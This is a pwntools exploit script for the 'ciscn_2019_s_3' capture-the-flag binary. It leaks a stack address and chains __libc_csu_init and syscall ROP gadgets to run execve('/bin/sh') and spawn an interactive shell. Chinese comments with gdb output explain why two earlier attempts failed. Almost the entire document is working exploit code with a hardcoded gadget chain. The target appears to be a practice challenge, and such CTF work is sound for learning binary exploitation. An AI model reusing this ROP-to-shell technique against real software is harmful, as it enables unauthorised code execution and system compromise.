#!/usr/bin/python3.6
from pwn import *


filename = './ciscn_2019_s_3'
elf = ELF(filename)
p = process(filename)
# p = remote("node3.buuoj.cn", 26355)

main = elf.sym["main"]
log.warn(f'main={hex(main)}')

payload = b'/bin/sh\x00' + b'b'*8 + p64(elf.sym['vuln'])

p.send(payload)
offset = 0x118
binsh = u64(p.recv()[32:40]) - 0x118
log.success('binsh = ' + hex(binsh))

# Pop to rbx, rbp, r12, r13, r14, r15
p6r = 0x000000000040059A
mov_r12_call = 0x0000000000400580

mov_exec_ret = 0x00000000004004e2 
sys_call = 0x0000000000400517
pop_rdi_ret = 0x00000000004005a3

# 1
# 直接传递字符串是不 ok 的，因为 rdi 的高32位被强制截断为 0；
# 0x0000000000400586 <+70>:    mov    %r15d,%edi
# (gdb) i r rdi
# rdi            0x7ffebe3175b0   140732089333168
# (gdb) ni
# 0x0000000000400589 in __libc_csu_init ()
# (gdb) i r rdi
# rdi            0xbe3175b0       3190912432

# 2
# 在 call r12 之后想要通过gadget去补救也是不 OK 的，因为call 指令 push 了一个地址，程序无法执行后面的 gadget
# 

payload = b'/bin/sh\x00' + p64(mov_exec_ret)\
    + p64(p6r)\
    + p64(0) + p64(1)\
    + p64(binsh + 8)\
    + p64(0) * 2\
    + p64(binsh)\
    + p64(mov_r12_call)\
    + p64(0) * 7\
    + p64(pop_rdi_ret)\
    + p64(binsh)\
    + p64(sys_call)

# input()

p.send(payload)
p.interactive()
